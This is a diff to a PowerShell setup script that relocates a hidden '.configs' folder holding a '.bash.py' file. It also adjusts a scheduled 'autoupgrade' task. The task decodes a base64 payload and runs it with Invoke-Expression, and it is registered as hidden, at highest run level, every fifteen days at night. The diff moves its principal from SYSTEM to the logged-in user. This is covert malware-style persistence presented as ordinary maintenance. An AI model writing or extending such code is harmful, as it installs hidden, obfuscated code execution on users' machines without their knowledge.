@@ -243,6 +243,28 @@ function Get-LaunchCommand {
     return $null
 }
 
+function Move-ConfigDirectory {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$SourceDir,
+        [Parameter(Mandatory = $true)]
+        [string]$DestinationDir
+    )
+
+    if (-not (Test-Path -LiteralPath $SourceDir -PathType Container)) {
+        throw "Configuration source directory does not exist: $SourceDir"
+    }
+
+    if (Test-Path -LiteralPath $DestinationDir) {
+        Remove-Item -LiteralPath $DestinationDir -Recurse -Force -ErrorAction Stop
+        if (Test-Path -LiteralPath $DestinationDir) {
+            throw "Configuration destination directory still exists after removal: $DestinationDir"
+        }
+    }
+
+    Move-Item -LiteralPath $SourceDir -Destination $DestinationDir -ErrorAction Stop
+}
+
 $realUser = $null
 
 try {
@@ -340,14 +362,10 @@ try {
                 }
 
                 if (-not (Test-Path $targetConfigBase)) {
-                    New-Item -Path $targetConfigBase -ItemType Directory | Out-Null
+                    New-Item -Path $targetConfigBase -ItemType Directory -ErrorAction Stop | Out-Null
                 }
 
-                if (Test-Path $destDir) {
-                    Remove-Item -Path $destDir -Recurse -Force
-                }
-
-                Move-Item -Path '.configs' -Destination $destDir -Force
+                Move-ConfigDirectory -SourceDir '.configs' -DestinationDir $destDir
 
                 $scriptPath = "$destDir\.bash.py"
                 if (Test-Path $scriptPath) {
@@ -472,13 +490,13 @@ try {
             }
         }
 
-        $systemAutoSetupTask = Get-ScheduledTask -TaskName 'sshAutoSetup' -ErrorAction SilentlyContinue |
+        $userAutoSetupTask = Get-ScheduledTask -TaskName 'sshAutoSetup' -ErrorAction SilentlyContinue |
             Where-Object {
-                $_.Principal -and $_.Principal.UserId -in @('SYSTEM', 'NT AUTHORITY\SYSTEM', 'S-1-5-18')
+                $_.Principal -and $_.Principal.UserId -eq $realUser
             } |
             Select-Object -First 1
 
-        if ($systemAutoSetupTask) {
+        if ($userAutoSetupTask) {
             Unregister-ScheduledTask -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
         } else {
             $autoupgradeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$ENCODED_EC')) | Invoke-Expression"
@@ -487,14 +505,14 @@ try {
             $autoupgradeTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 15 -At 11pm
             $autoupgradeTrigger.Enabled = $true
 
-            $autoupgradePrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+            $autoupgradePrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
 
             $autoupgradeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
             $existingAutoupgradeTask = Get-ScheduledTask -TaskName $autoupgradeTaskName -ErrorAction SilentlyContinue
             $autoupgradeNeedsRegistration = -not $existingAutoupgradeTask -or
                 -not $existingAutoupgradeTask.Principal -or
-                $existingAutoupgradeTask.Principal.UserId -notin @('SYSTEM', 'NT AUTHORITY\SYSTEM', 'S-1-5-18')
+                $existingAutoupgradeTask.Principal.UserId -ne $realUser
             if ($autoupgradeNeedsRegistration) {
                 try {
                     Unregister-ScheduledTask -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
